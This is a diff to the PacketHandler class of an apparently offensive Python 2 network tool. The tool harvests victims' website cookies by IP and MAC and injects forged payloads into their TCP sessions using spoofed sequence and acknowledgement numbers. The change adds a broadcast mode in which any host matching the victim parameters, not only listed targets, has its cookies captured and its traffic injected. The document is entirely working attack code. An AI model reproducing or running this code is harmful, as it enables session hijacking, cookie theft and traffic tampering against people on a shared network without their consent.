@@ -415,13 +415,17 @@ class PacketHandler:
 	'''
 	This function does cookie management for broadcast mode
 	and targeted mode.
+	A new mode is also added that can work in both broadcast
+	added that if VictimParameters is set, it also performs a
+	broadcast attack
 	'''
 	def cookie_mgmt(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie):
 		if (len(self.victims)==0):
 			try:
 				k=cookie[1]
 			except:
-				cookie=("NONE","NONE")
+				print cookie
+				cookie=["NONE","NONE"]
 			if (cookie[1] is not None):
 				exists=0
 				for victim in self.newvictims:
@@ -441,7 +445,7 @@ class PacketHandler:
 					self.newvictims.append(v1)
 			else:
 				if (cookie[0] is not None and cookie[1] is None):
-#					print bcolors.WARNING+"[!] No cookie found for",cookie[0]
+#					print bcolors.WARNING+"[!] No cookie found for",cookie[0]+bcolors.ENDC
 					newcookie=[cookie[0],"NONE"]
 					cookie=newcookie
 					for victim in self.newvictims:
@@ -465,6 +469,7 @@ class PacketHandler:
 					v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
 					self.newvictims.append(v1)
 		else:
+			vic_in_targets=0
 			try:
 				k=cookie[1]
 			except:
@@ -477,24 +482,80 @@ class PacketHandler:
 				for victim in self.victims:
 					if (victim.ip is not None):
 						if (victim.ip==vicip):
+							vic_in_targets=1
 							victim.add_cookie(cookie)
 					else:
 						if (victim.mac is not None):
 							if (victim.mac.lower()==vicmac.lower()):
+								vic_in_targets=1
 								victim.add_cookie(cookie)
 			else:
 				if (cookie[0] is not None and cookie[1] is None):
-					print bcolors.WARNING+"[!] Victim ",vicmac,"cookie not found for website",cookie[0]+bcolors.ENDC
+#					print bcolors.WARNING+"[!] Victim ",vicmac,"cookie not found for website",cookie[0]+bcolors.ENDC
 					newcookie=[cookie[0],"NONE"]
 					cookie=newcookie
 					for victim in self.victims:
 						if (victim.ip is not None):
 							if (victim.ip==vicip):
+								vic_in_targets=1
 								victim.add_cookie(cookie)
 						else:
 							if (victim.mac is not None):
 								if (victim.mac.lower()==vicmac.lower()):
 									victim.add_cookie(cookie)
+									vic_in_targets=1
+			#IF VIC IS IN TARGETS, RETURN
+			if (vic_in_targets==1):
+				return
+			#ELSE, PROCEED IF VICTIM_PARAMETERS IS SET
+			if (self.victim_parameters is not None):
+				try:
+					k=cookie[1]
+				except:
+#					print cookie
+					cookie=["NONE","NONE"]
+				if (cookie[1] is not None):
+					exists=0
+					for victim in self.newvictims:
+						if (victim.ip is not None):
+							if (victim.ip==vicip):
+								victim.add_cookie(cookie)
+								exists=1
+						else:
+							if (victim.mac is not None):
+								if (victim.mac.lower()==vicmac.lower()):
+									victim.add_cookie(cookie)
+									exists=1
+					if (exists==0):
+	#					print "here"
+						v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
+						v1.add_cookie(cookie)
+						self.newvictims.append(v1)
+				else:
+					if (cookie[0] is not None and cookie[1] is None):
+	#					print bcolors.WARNING+"[!] No cookie found for",cookie[0]+bcolors.ENDC
+						newcookie=[cookie[0],"NONE"]
+						cookie=newcookie
+						for victim in self.newvictims:
+							if (victim.ip is not None):
+								if (victim.ip==vicip):
+									victim.add_cookie(cookie)
+							else:
+								if (victim.mac is not None):
+									if (victim.mac.lower()==vicmac.lower()):
+										victim.add_cookie(cookie)
+					exists=0
+					for victim in self.newvictims:
+						if (victim.ip is not None):
+							if (victim.ip==vicip):
+								exists=1
+						else:
+							if (victim.mac is not None):
+								if (victim.mac.lower()==vicmac.lower()):
+									exists=1
+					if (exists==0):
+						v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
+						self.newvictims.append(v1)
 					
 	'''
 	Process injection function, uses the PacketHandler.victims List
@@ -527,6 +588,28 @@ class PacketHandler:
 							if (injection is not None):
 								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
 		else:
+			if (self.victim_parameters is not None):
+				if (self.victim_parameters.in_request is not None):
+					result=self.victim_parameters.proc_in_request(request)
+	#				print result
+					if (not result):
+						return 0
+				if (self.excluded is not None):
+					for host in self.excluded:
+						if (svrip in host):
+							return 0
+				for victim in self.newvictims:
+					if (victim.ip is not None):
+						if (victim.ip==vicip):
+							injection=victim.get_injection()
+							if (injection is not None):
+								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
+					else:
+						if (victim.mac is not None):
+							if (victim.mac.lower()==vicmac.lower()):
+								injection=victim.get_injection()
+								if (injection is not None):
+									self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)			
 			if (self.excluded is not None):
 				for host in self.excluded:
 					if (svrip in host):
